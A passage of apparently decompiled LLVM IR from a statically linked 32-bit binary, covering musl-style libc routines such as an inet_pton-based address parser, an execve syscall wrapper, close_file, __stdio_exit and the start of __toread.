  %v4_80519e4 = sext i16 %stack_var_-52.1 to i32
  store i32 %v4_80519e4, i32* %edx.global-to-local, align 4
  %v1_80519ea = urem i32 %v0_80519e8, 8
  store i32 %v1_80519ea, i32* %eax.global-to-local, align 4
  %v2_80519ed = load i32, i32* @esp, align 4
  %v4_80519ed = mul nuw nsw i32 %v1_80519ea, 2
  %v5_80519ed = or i32 %v4_80519ed, 32
  %v6_80519ed = add i32 %v2_80519ed, %v5_80519ed
  %v7_80519ed = inttoptr i32 %v6_80519ed to i16*
  store i16 %stack_var_-52.1, i16* %v7_80519ed, align 2
  %v0_80519f2 = load i32, i32* @esi, align 4
  %v1_80519f2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80519f2 = add i32 %v1_80519f2, %v0_80519f2
  %v3_80519f2 = inttoptr i32 %v2_80519f2 to i8*
  %v4_80519f2 = load i8, i8* %v3_80519f2, align 1
  %v5_80519f2 = zext i8 %v4_80519f2 to i32
  %v6_80519f2 = load i32, i32* %eax.global-to-local, align 4
  %v7_80519f2 = and i32 %v6_80519f2, -256
  %v8_80519f2 = or i32 %v7_80519f2, %v5_80519f2
  store i32 %v8_80519f2, i32* %eax.global-to-local, align 4
  %v4_80519f5 = icmp eq i8 %v4_80519f2, 0
  %v1_80519f7 = icmp eq i1 %v4_80519f5, false
  br i1 %v1_80519f7, label %dec_label_pc_8051a08, label %dec_label_pc_80519f9

dec_label_pc_80519f9:                             ; preds = %dec_label_pc_80519e4
  %v0_80519f9 = load i32, i32* @ebp, align 4
  %v2_80519f9 = icmp slt i32 %v0_80519f9, 0
  %v1_80519fb = icmp eq i1 %v2_80519f9, false
  br i1 %v1_80519fb, label %dec_label_pc_8051a4b, label %dec_label_pc_80519fd

dec_label_pc_80519fd:                             ; preds = %dec_label_pc_80519f9
  %v0_80519fd = load i32, i32* @edi, align 4
  %v9_80519fd = icmp eq i32 %v0_80519fd, 7
  %v1_8051a00 = icmp eq i1 %v9_80519fd, false
  br i1 %v1_8051a00, label %dec_label_pc_8051ad2, label %dec_label_pc_8051a4b

dec_label_pc_8051a08:                             ; preds = %dec_label_pc_80519e4
  %v0_8051a08 = load i32, i32* @edi, align 4
  %v9_8051a08 = icmp eq i32 %v0_8051a08, 7
  br i1 %v9_8051a08, label %dec_label_pc_8051ad2, label %dec_label_pc_8051a11

dec_label_pc_8051a11:                             ; preds = %dec_label_pc_8051a08
  %v10_8051a11 = icmp eq i8 %v4_80519f2, 58
  br i1 %v10_8051a11, label %dec_label_pc_8051a37, label %dec_label_pc_8051a15

dec_label_pc_8051a15:                             ; preds = %dec_label_pc_8051a11
  %v10_8051a15 = icmp eq i8 %v4_80519f2, 46
  %v1_8051a17 = icmp eq i1 %v10_8051a15, false
  br i1 %v1_8051a17, label %dec_label_pc_8051ad2, label %dec_label_pc_8051a1d

dec_label_pc_8051a1d:                             ; preds = %dec_label_pc_8051a15
  %v1_8051a1d = add i32 %v0_8051a08, -5
  %v6_8051a1d = sub i32 4, %v0_8051a08
  %v7_8051a1d = and i32 %v6_8051a1d, %v0_8051a08
  %v8_8051a1d = icmp slt i32 %v7_8051a1d, 0
  %v9_8051a1d = icmp eq i32 %v1_8051a1d, 0
  %v10_8051a1d = icmp slt i32 %v1_8051a1d, 0
  %v3_8051a20 = icmp eq i1 %v10_8051a1d, %v8_8051a1d
  %v4_8051a20 = icmp eq i1 %v9_8051a1d, false
  %v5_8051a20 = and i1 %v4_8051a20, %v3_8051a20
  br i1 %v5_8051a20, label %dec_label_pc_8051a2c, label %dec_label_pc_8051a22

dec_label_pc_8051a22:                             ; preds = %dec_label_pc_8051a1d
  %v2_8051a22 = load i32, i32* %stack_var_-76, align 4
  %v3_8051a22 = trunc i32 %v2_8051a22 to i8
  %v4_8051a22 = icmp eq i8 %v3_8051a22, 0
  %v1_8051a26 = icmp eq i1 %v4_8051a22, false
  br i1 %v1_8051a26, label %dec_label_pc_8051ad2, label %dec_label_pc_8051a2c

dec_label_pc_8051a2c:                             ; preds = %dec_label_pc_8051a22, %dec_label_pc_8051a1d
  %v1_8051a2c = add i32 %v0_8051a08, 1
  store i32 %v1_8051a2c, i32* @edi, align 4
  %v0_8051a4b.pr.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051a4b

dec_label_pc_8051a37:                             ; preds = %dec_label_pc_8051a11
  %v2_8051a37 = add i32 %v0_80519f2, 1
  %v3_8051a37 = add i32 %v2_8051a37, %v1_80519f2
  store i32 %v3_8051a37, i32* @esi, align 4
  %v0_8051966.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051a3b

dec_label_pc_8051a3b:                             ; preds = %dec_label_pc_80519a2, %dec_label_pc_8051a37
  %v0_8051966.pre = phi i32 [ %v0_8051a41, %dec_label_pc_80519a2 ], [ %v0_8051966.pre.pre, %dec_label_pc_8051a37 ]
  %v0_8051a3b = phi i32 [ %v0_8051a41, %dec_label_pc_80519a2 ], [ %v0_8051a08, %dec_label_pc_8051a37 ]
  %v0_805196e19 = phi i32 [ %v0_8051990, %dec_label_pc_80519a2 ], [ %v3_8051a37, %dec_label_pc_8051a37 ]
  %v1_8051a3b = add i32 %v0_8051a3b, 1
  store i32 %v1_8051a3b, i32* @edi, align 4
  br label %dec_label_pc_8051966

dec_label_pc_8051a41:                             ; preds = %dec_label_pc_8051983
  store i32 %v0_8051a41, i32* @ebp, align 4
  br label %dec_label_pc_8051a4b

dec_label_pc_8051a4b:                             ; preds = %dec_label_pc_80519f9, %dec_label_pc_80519fd, %dec_label_pc_8051a2c, %dec_label_pc_8051a41
  %v1_8051a53 = phi i32 [ %v0_8051a41, %dec_label_pc_8051a41 ], [ %v0_80519f9, %dec_label_pc_80519f9 ], [ %v0_80519f9, %dec_label_pc_80519fd ], [ %v0_8051a4b.pr.pre, %dec_label_pc_8051a2c ]
  %storemerge = phi i32 [ 0, %dec_label_pc_8051a41 ], [ 0, %dec_label_pc_80519f9 ], [ 0, %dec_label_pc_80519fd ], [ 1, %dec_label_pc_8051a2c ]
  %v2_8051a4b = icmp slt i32 %v1_8051a53, 0
  br i1 %v2_8051a4b, label %dec_label_pc_8051a8a, label %dec_label_pc_8051a4f

dec_label_pc_8051a4f:                             ; preds = %dec_label_pc_8051a4b
  %v0_8051a4f = load i32, i32* @edi, align 4
  %v0_8051a53 = load i32, i32* @esp, align 4
  %v2_8051a53 = mul i32 %v1_8051a53, 2
  %v3_8051a53 = add i32 %v2_8051a53, 32
  %v4_8051a53 = add i32 %v3_8051a53, %v0_8051a53
  store i32 %v4_8051a53, i32* %ebx.global-to-local, align 4
  %v2_8051a5d = mul i32 %v0_8051a4f, 2
  store i32 %v2_8051a5d, i32* %edx.global-to-local, align 4
  %v1_8051a60 = add i32 %v4_8051a53, 14
  %v2_8051a64 = sub i32 %v1_8051a60, %v2_8051a5d
  store i32 %v2_8051a64, i32* %eax.global-to-local, align 4
  %v6_8051a67 = call i32 @memmove(i32 %v2_8051a64, i32 %v4_8051a53)
  %v0_8051a71 = load i32, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8051a78 = load i32, i32* @edi, align 4
  %v2_8051a78 = sub i32 7, %v1_8051a78
  store i32 %v2_8051a78, i32* %edx.global-to-local, align 4
  %v1_8051a8356 = add i32 %v0_8051a71, 2
  store i32 %v1_8051a8356, i32* %eax.global-to-local, align 4
  %v5_8051a8858 = icmp sgt i32 %v2_8051a78, 0
  br i1 %v5_8051a8858, label %dec_label_pc_8051a7c, label %dec_label_pc_8051a8a.loopexit

dec_label_pc_8051a7c:                             ; preds = %dec_label_pc_8051a4f, %dec_label_pc_8051a7c
  %v0_8051a8359 = phi i32 [ %v0_8051a83.pre, %dec_label_pc_8051a7c ], [ %v0_8051a71, %dec_label_pc_8051a4f ]
  %v2_8051a7c = inttoptr i32 %v0_8051a8359 to i16*
  store i16 0, i16* %v2_8051a7c, align 2
  %v0_8051a82 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051a82 = add i32 %v0_8051a82, 1
  store i32 %v1_8051a82, i32* %ecx.global-to-local, align 4
  %v0_8051a83.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a86.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a83 = add i32 %v0_8051a83.pre, 2
  store i32 %v1_8051a83, i32* %eax.global-to-local, align 4
  %v5_8051a88 = icmp slt i32 %v1_8051a82, %v1_8051a86.pre
  br i1 %v5_8051a88, label %dec_label_pc_8051a7c, label %dec_label_pc_8051a83.dec_label_pc_8051a8a.loopexit_crit_edge

dec_label_pc_8051a83.dec_label_pc_8051a8a.loopexit_crit_edge: ; preds = %dec_label_pc_8051a7c
  br label %dec_label_pc_8051a8a.loopexit

dec_label_pc_8051a8a.loopexit:                    ; preds = %dec_label_pc_8051a83.dec_label_pc_8051a8a.loopexit_crit_edge, %dec_label_pc_8051a4f
  br label %dec_label_pc_8051a8a

dec_label_pc_8051a8a:                             ; preds = %dec_label_pc_8051a8a.loopexit, %dec_label_pc_8051a4b
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8051a8f = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8051a8f, i32* @ecx, align 4
  %v5_8051a9c = add i32 %arg3, -2
  br label %dec_label_pc_8051a93

dec_label_pc_8051a93:                             ; preds = %dec_label_pc_8051a93.dec_label_pc_8051a93_crit_edge, %dec_label_pc_8051a8a
  %v3_8051a9c = phi i32 [ %v1_8051aa9, %dec_label_pc_8051a93.dec_label_pc_8051a93_crit_edge ], [ 1, %dec_label_pc_8051a8a ]
  %v0_8051a93 = phi i32 [ %v0_8051a93.pre, %dec_label_pc_8051a93.dec_label_pc_8051a93_crit_edge ], [ %v2_8051a8f, %dec_label_pc_8051a8a ]
  %v2_8051a93 = mul i32 %v3_8051a9c, 2
  %v3_8051a93 = add i32 %v0_8051a93, -1
  %v4_8051a93 = add i32 %v3_8051a93, %v2_8051a93
  %v5_8051a93 = inttoptr i32 %v4_8051a93 to i8*
  %v6_8051a93 = load i8, i8* %v5_8051a93, align 1
  %v7_8051a93 = zext i8 %v6_8051a93 to i32
  store i32 %v7_8051a93, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v6_8051a9c = add i32 %v5_8051a9c, %v2_8051a93
  %v7_8051a9c = inttoptr i32 %v6_8051a9c to i8*
  store i8 %v6_8051a93, i8* %v7_8051a9c, align 1
  %v0_8051aa0 = load i32, i32* @ecx, align 4
  %v1_8051aa0 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051aa0 = mul i32 %v1_8051aa0, 2
  %v3_8051aa0 = add i32 %v0_8051aa0, -2
  %v4_8051aa0 = add i32 %v3_8051aa0, %v2_8051aa0
  %v5_8051aa0 = inttoptr i32 %v4_8051aa0 to i16*
  %v6_8051aa0 = load i16, i16* %v5_8051aa0, align 2
  %v7_8051aa0 = zext i16 %v6_8051aa0 to i32
  %v8_8051aa0 = load i32, i32* %eax.global-to-local, align 4
  %v9_8051aa0 = and i32 %v8_8051aa0, -65536
  %v10_8051aa0 = or i32 %v9_8051aa0, %v7_8051aa0
  store i32 %v10_8051aa0, i32* %eax.global-to-local, align 4
  %v1_8051aa5 = trunc i16 %v6_8051aa0 to i8
  %v2_8051aa5 = load i32, i32* @ebx, align 4
  %v5_8051aa5 = add i32 %v2_8051aa0, -1
  %v6_8051aa5 = add i32 %v5_8051aa5, %v2_8051aa5
  %v7_8051aa5 = inttoptr i32 %v6_8051aa5 to i8*
  store i8 %v1_8051aa5, i8* %v7_8051aa5, align 1
  %v0_8051aa9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051aa9 = add i32 %v0_8051aa9, 1
  store i32 %v1_8051aa9, i32* %edx.global-to-local, align 4
  %v9_8051aaa = icmp eq i32 %v0_8051aa9, 8
  %v1_8051aad = icmp eq i1 %v9_8051aaa, false
  br i1 %v1_8051aad, label %dec_label_pc_8051a93.dec_label_pc_8051a93_crit_edge, label %dec_label_pc_8051aaf

dec_label_pc_8051a93.dec_label_pc_8051a93_crit_edge: ; preds = %dec_label_pc_8051a93
  %v0_8051a93.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051a93

dec_label_pc_8051aaf:                             ; preds = %dec_label_pc_8051a93
  %v4_8051aaf = icmp eq i32 %storemerge, 0
  br i1 %v4_8051aaf, label %dec_label_pc_8051ad6, label %dec_label_pc_8051ab6

dec_label_pc_8051ab6:                             ; preds = %dec_label_pc_8051aaf
  %v0_8051ab6 = load i32, i32* %eax.global-to-local, align 4
  %v0_8051ab7 = load i32, i32* @ebx, align 4
  %v1_8051ab9 = add i32 %v0_8051ab7, 12
  store i32 %v1_8051ab9, i32* %eax.global-to-local, align 4
  %v0_8051abd = load i32, i32* @esi, align 4
  %v5_8051abd = inttoptr i32 %v0_8051abd to i8*
  %sext = mul i32 %v0_8051ab6, 65536
  %v5_8051ac0 = sdiv i32 %sext, 65536
  %v7_8051ac0 = call i32 @inet_pton(i32 2, i8* %v5_8051abd, i32 %v1_8051ab9, i32 %v5_8051ac0)
  %tmp48 = icmp slt i32 %v7_8051ac0, 1
  %tmp49 = icmp eq i1 %tmp48, false
  %v6_8051aca = zext i1 %tmp49 to i32
  store i32 %v6_8051aca, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ae8

dec_label_pc_8051ad2:                             ; preds = %dec_label_pc_8051927, %dec_label_pc_805191f, %dec_label_pc_80518f7, %dec_label_pc_80518ee, %dec_label_pc_80518e1, %dec_label_pc_8051a08, %dec_label_pc_80519dc, %dec_label_pc_8051999, %dec_label_pc_8051911, %dec_label_pc_8051a22, %dec_label_pc_8051a15, %dec_label_pc_80519fd, %dec_label_pc_8051957
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ae8

dec_label_pc_8051ad6:                             ; preds = %dec_label_pc_8051911, %dec_label_pc_8051aaf
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ae8

dec_label_pc_8051add:                             ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051adf

dec_label_pc_8051adf:                             ; preds = %dec_label_pc_8051931, %dec_label_pc_8051add
  %v2_8051907 = phi i32 [ %v1_8051927, %dec_label_pc_8051931 ], [ 0, %dec_label_pc_8051add ]
  %v0_80518ee = phi i32 [ %v3_8051931, %dec_label_pc_8051931 ], [ %v4_80518bb, %dec_label_pc_8051add ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80518d5

dec_label_pc_8051ae8:                             ; preds = %dec_label_pc_8051ad6, %dec_label_pc_8051ad2, %dec_label_pc_8051ab6, %dec_label_pc_805193f
  %v0_8051aef = phi i32 [ 1, %dec_label_pc_8051ad6 ], [ 0, %dec_label_pc_8051ad2 ], [ %v6_8051aca, %dec_label_pc_8051ab6 ], [ -1, %dec_label_pc_805193f ]
  store i32 %v0_80518b3, i32* %ebx.global-to-local, align 4
  store i32 %v0_80518b2, i32* @esi, align 4
  store i32 %v0_80518b1, i32* @edi, align 4
  store i32 %v0_80518b0, i32* @ebp, align 4
  ret i32 %v0_8051aef

; uselistorder directives
  uselistorder i32 %v1_8051aa9, { 1, 0 }
  uselistorder i32 %v2_8051a93, { 1, 0 }
  uselistorder i32 %v0_8051a83.pre, { 1, 0 }
  uselistorder i32 %v2_8051a5d, { 1, 0 }
  uselistorder i32 %v1_8051a3b, { 1, 0 }
  uselistorder i32 %v1_8051a1d, { 1, 0 }
  uselistorder i32 %v0_8051a08, { 5, 2, 1, 4, 3, 0 }
  uselistorder i32 %v1_80519ea, { 1, 0 }
  uselistorder i32 %v1_80519d7, { 1, 0 }
  uselistorder i32 %v1_80519c0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80519ad, { 1, 2, 3, 0 }
  uselistorder i32 %v2_80519ae, { 1, 0 }
  uselistorder i32 %v0_8051a41, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %v1_8051986, { 1, 0 }
  uselistorder i32 %v2_8051968, { 1, 0 }
  uselistorder i32 %v1_80518f7, { 1, 0 }
  uselistorder i32 %v0_8051907, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80518d9, { 1, 2, 0 }
  uselistorder i32 %v0_80518cc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_80518c9, { 1, 0, 2 }
  uselistorder i32 %v4_80518bb, { 2, 0, 1, 3 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 1, 0 }
  uselistorder i32* %edi.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 4, 6, 5, 7, 1 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 24, 25, 14, 15, 16, 17, 18, 20, 19, 21, 22, 0, 1, 2, 4, 3, 23 }
  uselistorder i32 14, { 1, 2, 3, 0, 4 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 5, { 5, 9, 11, 4, 0, 10, 12, 1, 3, 6, 13, 7, 2, 8 }
  uselistorder i32 -97, { 2, 0, 1, 3 }
  uselistorder i32 7, { 4, 1, 2, 0, 12, 6, 9, 7, 5, 8, 13, 3, 10, 11 }
  uselistorder i16 0, { 4, 3, 5, 0, 6, 7, 1, 2 }
  uselistorder i32 254, { 3, 1, 4, 2, 0 }
  uselistorder i32 %arg3, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8051adf, { 1, 0 }
  uselistorder label %dec_label_pc_8051ad6, { 1, 0 }
  uselistorder label %dec_label_pc_8051ad2, { 9, 10, 5, 11, 6, 7, 12, 0, 1, 8, 2, 3, 4 }
  uselistorder label %dec_label_pc_8051a7c, { 1, 0 }
  uselistorder label %dec_label_pc_8051a4b, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051a3b, { 1, 0 }
  uselistorder label %dec_label_pc_80519e4, { 1, 0 }
  uselistorder label %dec_label_pc_80518f7, { 1, 0 }
  uselistorder label %dec_label_pc_80518ee, { 1, 0 }
  uselistorder label %dec_label_pc_80518d5, { 1, 0 }
}

define i32 @execve(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8051af0 = load i32, i32* @edi, align 4
  store i32 11, i32* @eax, align 4
  store i32 %arg1, i32* @edx, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_8051b02 = call i32 @__vsyscall(i32 %v0_8051af0)
  %v1_8051b0c = call i32 @__syscall_ret(i32 %v1_8051b02)
  ret i32 %v1_8051b0c
}

define i32 @close_file() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051b14 = load i32, i32* @ebx, align 4
  %v0_8051b15 = load i32, i32* @eax, align 4
  store i32 %v0_8051b15, i32* @ebx, align 4
  %v1_8051b1a = icmp eq i32 %v0_8051b15, 0
  br i1 %v1_8051b1a, label %dec_label_pc_8051b5d, label %dec_label_pc_8051b1e

dec_label_pc_8051b1e:                             ; preds = %entry
  %v1_8051b1e = add i32 %v0_8051b15, 76
  %v2_8051b1e = inttoptr i32 %v1_8051b1e to i32*
  %v3_8051b1e = load i32, i32* %v2_8051b1e, align 4
  %v2_8051b21 = icmp slt i32 %v3_8051b1e, 0
  br i1 %v2_8051b21, label %dec_label_pc_8051b31, label %dec_label_pc_8051b25

dec_label_pc_8051b25:                             ; preds = %dec_label_pc_8051b1e
  %v1_8051b29 = call i32 @__lockfile(i32 %v0_8051b15)
  %v0_8051b31.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b31

dec_label_pc_8051b31:                             ; preds = %dec_label_pc_8051b1e, %dec_label_pc_8051b25
  %v4_8051b3f = phi i32 [ %v0_8051b15, %dec_label_pc_8051b1e ], [ %v0_8051b31.pre, %dec_label_pc_8051b25 ]
  %v1_8051b31 = add i32 %v4_8051b3f, 20
  %v2_8051b31 = inttoptr i32 %v1_8051b31 to i32*
  %v3_8051b31 = load i32, i32* %v2_8051b31, align 4
  %v2_8051b34 = add i32 %v4_8051b3f, 28
  %v3_8051b34 = inttoptr i32 %v2_8051b34 to i32*
  %v4_8051b34 = load i32, i32* %v3_8051b34, align 4
  %tmp = icmp ugt i32 %v3_8051b31, %v4_8051b34
  br i1 %tmp, label %dec_label_pc_8051b39, label %dec_label_pc_8051b45

dec_label_pc_8051b39:                             ; preds = %dec_label_pc_8051b31
  %v5_8051b3f = add i32 %v4_8051b3f, 36
  %v6_8051b3f = inttoptr i32 %v5_8051b3f to i32*
  %v7_8051b3f = load i32, i32* %v6_8051b3f, align 4
  call void @__pseudo_call(i32 %v7_8051b3f)
  %v0_8051b45.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b45

dec_label_pc_8051b45:                             ; preds = %dec_label_pc_8051b31, %dec_label_pc_8051b39
  %v4_8051b57 = phi i32 [ %v4_8051b3f, %dec_label_pc_8051b31 ], [ %v0_8051b45.pre, %dec_label_pc_8051b39 ]
  %v1_8051b45 = add i32 %v4_8051b57, 4
  %v2_8051b45 = inttoptr i32 %v1_8051b45 to i32*
  %v3_8051b45 = load i32, i32* %v2_8051b45, align 4
  %v1_8051b48 = add i32 %v4_8051b57, 8
  %v2_8051b48 = inttoptr i32 %v1_8051b48 to i32*
  %v3_8051b48 = load i32, i32* %v2_8051b48, align 4
  %v7_8051b4b = icmp ult i32 %v3_8051b45, %v3_8051b48
  %v1_8051b4d = icmp eq i1 %v7_8051b4b, false
  br i1 %v1_8051b4d, label %dec_label_pc_8051b5d, label %dec_label_pc_8051b4f

dec_label_pc_8051b4f:                             ; preds = %dec_label_pc_8051b45
  %v5_8051b57 = add i32 %v4_8051b57, 40
  %v6_8051b57 = inttoptr i32 %v5_8051b57 to i32*
  %v7_8051b57 = load i32, i32* %v6_8051b57, align 4
  call void @__pseudo_call(i32 %v7_8051b57)
  br label %dec_label_pc_8051b5d

dec_label_pc_8051b5d:                             ; preds = %dec_label_pc_8051b45, %entry, %dec_label_pc_8051b4f
  %v2_8051b5d = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8051b14, i32* @ebx, align 4
  ret i32 %v2_8051b5d

; uselistorder directives
  uselistorder i32 %v4_8051b57, { 0, 2, 1 }
  uselistorder i32 %v4_8051b3f, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051b5d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051b45, { 1, 0 }
  uselistorder label %dec_label_pc_8051b31, { 1, 0 }
}

define i32 @__stdio_exit() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051b61 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b61, i32* %stack_var_-4, align 4
  %v1_8051b65 = call i32 @__ofl_lock(i32 %v0_8051b61)
  %storemerge.in1 = inttoptr i32 %v1_8051b65 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_8051b783 = icmp eq i32 %storemerge2, 0
  %v1_8051b7a10 = icmp eq i1 %v1_8051b783, false
  br i1 %v1_8051b7a10, label %dec_label_pc_8051b6e, label %dec_label_pc_8051b7c

dec_label_pc_8051b6e:                             ; preds = %entry, %dec_label_pc_8051b6e
  %v0_8051b6e = phi i32 [ %storemerge, %dec_label_pc_8051b6e ], [ %storemerge2, %entry ]
  store i32 %v0_8051b6e, i32* @eax, align 4
  %v0_8051b70 = call i32 @close_file()
  %v0_8051b75 = load i32, i32* @ebx, align 4
  %v1_8051b75 = add i32 %v0_8051b75, 56
  %storemerge.in = inttoptr i32 %v1_8051b75 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_8051b78 = icmp eq i32 %storemerge, 0
  %v1_8051b7a = icmp eq i1 %v1_8051b78, false
  br i1 %v1_8051b7a, label %dec_label_pc_8051b6e, label %dec_label_pc_8051b7c

dec_label_pc_8051b7c:                             ; preds = %dec_label_pc_8051b6e, %entry
  %v0_8051b7c = load i32, i32* @global_var_8056f28.390, align 8
  store i32 %v0_8051b7c, i32* @eax, align 4
  %v0_8051b81 = call i32 @close_file()
  %v0_8051b86 = load i32, i32* @global_var_8056dec.368, align 4
  store i32 %v0_8051b86, i32* @eax, align 4
  %v2_8051b8d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051b8d, i32* @ebx, align 4
  %v0_8051b8e = call i32 @close_file()
  ret i32 %v0_8051b8e

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 ()* @close_file, { 2, 1, 0 }
  uselistorder i32 (i32)* @__ofl_lock, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051b6e, { 1, 0 }
}

define i32 @__toread(i32* %arg1) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8051b90 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b90, i32* %stack_var_-4, align 4
  %v5_8051b91 = icmp ult i32* %stack_var_-4, inttoptr (i32 8 to i32*)
  store i1 %v5_8051b91, i1* %cf.global-to-local, align 1
  %v9_8051b91 = icmp eq i32* %stack_var_-4, inttoptr (i32 8 to i32*)
  store i1 %v9_8051b91, i1* %zf.global-to-local, align 1
  store i32 %tmp1, i32* %ebx.global-to-local, align 4
  %v1_8051b98 = add i32 %tmp1, 74
  %v2_8051b98 = inttoptr i32 %v1_8051b98 to i8*
  %v3_8051b98 = load i8, i8* %v2_8051b98, align 1
  %v4_8051b98 = zext i8 %v3_8051b98 to i32
  %v5_8051b98 = load i32, i32* @eax, align 4
  %v6_8051b98 = and i32 %v5_8051b98, -256
  %v7_8051b98 = or i32 %v6_8051b98, %v4_8051b98
  store i32 %v7_8051b98, i32* %eax.global-to-local, align 4
  %v1_8051b9b = add i8 %v3_8051b98, -1
  %v2_8051b9e = or i8 %v1_8051b9b, %v3_8051b98
  %v1_8051ba0 = add i32 %tmp1, 20
  %v2_8051ba0 = inttoptr i32 %v1_8051ba0 to i32*
  %v3_8051ba0 = load i32, i32* %v2_8051ba0, align 4
  store i32 %v3_8051ba0, i32* %eax.global-to-local, align 4
  %v2_8051ba3 = add i32 %tmp1, 44
  %v3_8051ba3 = inttoptr i32 %v2_8051ba3 to i32*
  %v4_8051ba3 = load i32, i32* %v3_8051ba3, align 4
  %v10_8051ba3 = icmp ult i32 %v3_8051ba0, %v4_8051ba3
  store i1 %v10_8051ba3, i1* %cf.global-to-local, align 1
  %v15_8051ba3 = icmp eq i32 %v3_8051ba0, %v4_8051ba3
  store i1 %v15_8051ba3, i1* %zf.global-to-local, align 1
  store i8 %v2_8051b9e, i8* %v2_8051b98, align 1
  %v0_8051ba9 = load i1, i1* %cf.global-to-local, align 1
  %v1_8051ba9 = load i1, i1* %zf.global-to-local, align 1
  %v2_8051ba9 = or i1 %v0_8051ba9, %v1_8051ba9
  br i1 %v2_8051ba9, label %dec_label_pc_8051bb7, label %dec_label_pc_8051bab

dec_label_pc_8051bab:                             ; preds = %entry
  %v0_8051bb0 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8051bb1 = add i32 %v0_8051bb0, 36
  %v6_8051bb1 = inttoptr i32 %v5_8051bb1 to i32*
  %v7_8051bb1 = load i32, i32* %v6_8051bb1, align 4
  call void @__pseudo_call(i32 %v7_8051bb1)
  %v0_8051bb4 = load i32, i32* @esp, align 4
  %v2_8051bb4 = icmp ugt i32 %v0_8051bb4, -17
  store i1 %v2_8051bb4, i1* %cf.global-to-local, align 1
  %v6_8051bb4 = icmp eq i32 %v0_8051bb4, -16
  store i1 %v6_8051bb4, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8051bb7

dec_label_pc_8051bb7:                             ; preds = %entry, %dec_label_pc_8051bab
  %v0_8051bb7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051bb7 = inttoptr i32 %v0_8051bb7 to i32*
  %v2_8051bb7 = load i32, i32* %v1_8051bb7, align 4
  store i32 %v2_8051bb7, i32* %eax.global-to-local, align 4
  %v1_8051bb9 = add i32 %v0_8051bb7, 16
  %v2_8051bb9 = inttoptr i32 %v1_8051bb9 to i32*
  store i32 0, i32* %v2_8051bb9, align 4
  %v0_8051bc0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051bc0 = add i32 %v0_8051bc0, 28
  %v2_8051bc0 = inttoptr i32 %v1_8051bc0 to i32*
  store i32 0, i32* %v2_8051bc0, align 4
  %v0_8051bc7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051bc7 = add i32 %v0_8051bc7, 20
  %v2_8051bc7 = inttoptr i32 %v1_8051bc7 to i32*
  store i32 0, i32* %v2_8051bc7, align 4
  %v0_8051bce = load i32, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_8051bce = and i32 %v0_8051bce, 4
  %v3_8051bce = icmp eq i32 %v2_8051bce, 0
  store i1 %v3_8051bce, i1* %zf.global-to-local, align 1
  br i1 %v3_8051bce, label %dec_label_pc_8051bdc, label %dec_label_pc_8051bd2

dec_label_pc_8051bd2:                             ; preds = %dec_label_pc_8051bb7
  %v1_8051bd2 = or i32 %v0_8051bce, 32
  store i32 %v1_8051bd2, i32* %eax.global-to-local, align 4
  %v1_8051bd5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051bd5 = inttoptr i32 %v1_8051bd5 to i32*
